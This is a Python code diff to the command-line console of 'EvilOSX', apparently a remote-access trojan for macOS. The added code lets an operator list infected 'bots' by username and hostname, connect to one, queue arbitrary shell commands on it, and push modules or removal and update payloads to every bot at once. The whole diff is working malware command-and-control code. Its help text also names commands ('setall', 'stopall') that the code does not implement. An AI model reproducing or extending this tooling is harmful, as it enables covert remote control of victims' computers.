@@ -4,10 +4,16 @@ __license__ = "GPLv3"
 
 from queue import Queue
 from threading import Lock, current_thread
+from threading import Thread
+from time import strftime, localtime
 
 import urwid
 
-from server.view.helper import ViewABC
+from bot import loaders
+from server import modules
+from server.model import Command, CommandType
+from server.version import VERSION
+from server.view.helper import *
 
 
 class _OutputView:
@@ -147,13 +153,15 @@ class _CommandInput(urwid.Pile):
 
 
 class ViewCLI(ViewABC):
-    """This class interacts with the user.
+    """This class interacts with the user via a command line interface.
 
-    ViewABC implementation which shows a command line interface.
     The controller will register all listeners (set_on_*) for this view.
     """
 
-    def __init__(self):
+    def __init__(self, model, server_port):
+        self._model = model
+        self._server_port = server_port
+
         self._PALETTE = [
             ("reversed", urwid.BLACK, urwid.LIGHT_GRAY),
             ("normal", urwid.LIGHT_GRAY, urwid.BLACK),
@@ -167,6 +175,13 @@ class ViewCLI(ViewABC):
         self._command_input = _CommandInput()
 
         self._main_loop = None
+
+        self.set_window_title("EvilOSX v{} | Port: {} | Available bots: 0".format(VERSION, server_port))
+        self.output("Server started, waiting for connections...", "info")
+        self.output("Type \"help\" to show the help menu.", "info")
+
+        # http://urwid.org/reference/signals.html
+        urwid.connect_signal(self._command_input, "line_entered", self._process_command)
 
         # Initialize the frame.
         self._frame = urwid.Frame(
@@ -183,6 +198,25 @@ class ViewCLI(ViewABC):
     def output_separator(self):
         self.output(self._SEPARATOR)
 
+    def on_response(self, response: str):
+        self.output_separator()
+
+        for line in response.splitlines():
+            self.output(line)
+
+    def on_bot_added(self, bot: Bot):
+        self.set_window_title("EvilOSX v{} | Port: {} | Available bots: {}".format(
+            VERSION, self._server_port, self._model.get_bot_amount()
+        ))
+
+    def on_bot_removed(self, bot: Bot):
+        self.set_window_title("EvilOSX v{} | Port: {} | Available bots: {}".format(
+            VERSION, self._server_port, self._model.get_bot_amount()
+        ))
+
+    def on_bot_path_change(self, bot: Bot):
+        super().on_bot_path_change(bot)
+
     def prompt(self, prompt_text: str, lines: list = None) -> str:
         if lines:
             for line in lines:
@@ -191,11 +225,188 @@ class ViewCLI(ViewABC):
 
         return self._command_input.get_prompt_input()
 
-    def set_on_command(self, callback_function):
-        # See http://urwid.org/reference/signals.html
-        urwid.connect_signal(self._command_input, "line_entered", callback_function)
+    def _process_command(self, command: str):
+        if command.strip() == "":
+            return
 
-    def set_header_text(self, text: str):
+        self.output_separator()
+
+        if command == "help":
+            self.output("Commands other than the ones listed below will be run on the connected "
+                        "bot as a shell command.", "attention")
+            self.output("help                 -  Show this help menu.")
+            self.output("bots                 -  Show the amount of available bots.")
+            self.output("connect <id>         -  Start interacting with the bot (required before using \"use\").")
+            self.output("modules              -  Show a list of available modules.")
+            self.output("use <module_name>    -  Run the module on the connected bot.")
+            self.output("stop <module_name>   -  Ask the module to stop executing.")
+            self.output("setall <module_name> -  Set the module which will be run on every bot.")
+            self.output("stopall              -  Clear the globally set module.")
+            self.output("clear                -  Clear the screen.")
+            self.output("exit/q/quit          -  Close the server and exit.")
+        elif command.startswith("bots"):
+            if command == "bots":
+                bots = self._model.get_bots(limit=10)
+
+                if not bots:
+                    self.output("There are no available bots.", "attention")
+                else:
+                    self.output("No page specified, showing the first page.", "info")
+                    self.output("Use \"bots <page>\" to see a different page (each page is 10 results).", "info")
+
+                    for i, bot in enumerate(self._model.get_bots(limit=10)):
+                        self.output("{} = \"{}@{}\" (last seen: {})".format(
+                            str(i), bot.username, bot.hostname,
+                            strftime("%a, %b %d @ %H:%M:%S", localtime(bot.last_online))
+                        ))
+            else:
+                try:
+                    # Show the bots of the given "page".
+                    page_number = int(command.split(" ")[1])
+
+                    if page_number <= 0:
+                        page_number = 1
+
+                    skip_amount = (page_number * 10) - 10
+                    bots = self._model.get_bots(limit=10, skip_amount=skip_amount)
+
+                    if not bots:
+                        self.output("There are no available bots on this page.", "attention")
+                    else:
+                        self.output("Showing bots on page {}.".format(page_number), "info")
+
+                        for i, bot in enumerate(bots):
+                            self.output("{} = \"{}@{}\" (last seen: {})".format(
+                                str(i), bot.username, bot.hostname,
+                                strftime("%a, %b %d @ %H:%M:%S", localtime(bot.last_online))
+                            ))
+                except ValueError:
+                    self.output("Invalid page number.", "attention")
+        elif command.startswith("connect"):
+            try:
+                specified_id = int(command.split(" ")[1])
+                self._connected_bot = self._model.get_bots()[specified_id]
+
+                self.output("Connected to \"%s@%s\", ready to send commands." % (
+                    self._connected_bot.username, self._connected_bot.hostname
+                ), "info")
+                self.set_footer_text("Command ({}@{}, {}): ".format(
+                    self._connected_bot.username, self._connected_bot.hostname, self._connected_bot.local_path
+                ))
+            except (IndexError, ValueError):
+                self.output("Invalid bot ID (see \"bots\").", "attention")
+                self.output("Usage: connect <ID>", "attention")
+        elif command == "modules":
+            self.output("Type \"use <module_name>\" to use a module.", "info")
+
+            for module_name in modules.get_names():
+                try:
+                    module = modules.get_module(module_name)
+
+                    if not module:
+                        module = modules.load_module(module_name, self, self._model)
+
+                    self.output("{:16} -  {}".format(module_name, module.get_info()["Description"]))
+                except AttributeError as ex:
+                    self.output(str(ex), "attention")
+        elif command.startswith("useall"):
+            if command == "useall":
+                self.output("Usage: useall <module_name>", "attention")
+                self.output("Type \"modules\" to get a list of available modules.", "attention")
+            else:
+                module_name = command.split(" ")[1]
+
+                module_thread = Thread(target=self._run_module, args=(module_name, True))
+                module_thread.daemon = True
+                module_thread.start()
+        elif command == "clear":
+            self.clear()
+        elif command in ["exit", "q", "quit"]:
+            raise urwid.ExitMainLoop()
+        else:
+            # Commands that require a connected bot.
+            if not self._connected_bot:
+                self.output("You must be connected to a bot to perform this action.", "attention")
+                self.output("Type \"connect <ID>\" to connect to a bot.", "attention")
+            else:
+                if command.startswith("use"):
+                    if command == "use":
+                        self.output("Usage: use <module_name>", "attention")
+                        self.output("Type \"modules\" to get a list of available modules.", "attention")
+                    else:
+                        module_name = command.split(" ")[1]
+
+                        module_thread = Thread(target=self._run_module, args=(module_name,))
+                        module_thread.daemon = True
+                        module_thread.start()
+                else:
+                    # Regular shell command.
+                    self.output("Executing command: {}".format(command), "info")
+                    self._model.add_command(self._connected_bot.uid, Command(CommandType.SHELL, command.encode()))
+
+    def _run_module(self, module_name, mass_execute=False):
+        """Setup then run the module, required because otherwise calls to prompt block the main thread."""
+        try:
+            module = modules.get_module(module_name)
+            code = ("", b"")
+
+            if not module:
+                module = modules.load_module(module_name, self, self._model)
+
+            set_options = []
+
+            for setup_message in module.get_setup_messages():
+                set_options.append(self.prompt(setup_message))
+
+            successful, options = module.setup(set_options)
+
+            if not successful:
+                self.output("Module setup failed or cancelled.", "attention")
+            else:
+                if not options:
+                    options = {}
+
+                options["module_name"] = module_name
+
+                if mass_execute:
+                    bots = self._model.get_bots()
+
+                    for bot in bots:
+                        if module_name == "remove_bot":
+                            if code[0] != bot.loader_name:
+                                code = (bot.loader_name, loaders.get_remove_code(bot.loader_name))
+                        elif module_name == "update_bot":
+                            if code[0] != bot.loader_name:
+                                code = (bot.loader_name, loaders.get_update_code(bot.loader_name))
+                        else:
+                            if not code[0]:
+                                code = modules.get_code(module_name)
+
+                        self._model.add_command(bot.uid, Command(
+                            CommandType.MODULE, code[1], options
+                        ))
+
+                    self.output("Module added to the queue of {} bots.".format(len(bots)))
+                else:
+                    if module_name == "remove_bot":
+                        code = loaders.get_remove_code(self._connected_bot.loader_name)
+                    elif module_name == "update_bot":
+                        code = loaders.get_update_code(self._connected_bot.loader_name)
+                    else:
+                        code = modules.get_code(module_name)
+
+                    self._model.add_command(self._connected_bot.uid, Command(
+                        CommandType.MODULE, code, options
+                    ))
+
+                    self.output("Module added to the queue of \"{}@{}\".".format(
+                        self._connected_bot.username, self._connected_bot.hostname
+                    ), "info")
+        except ImportError:
+            self.output("Failed to find module: {}".format(module_name), "attention")
+            self.output("Type \"modules\" to get a list of available modules.", "attention")
+
+    def set_window_title(self, text: str):
         self._header.set_text(text)
         self._async_reload()
 
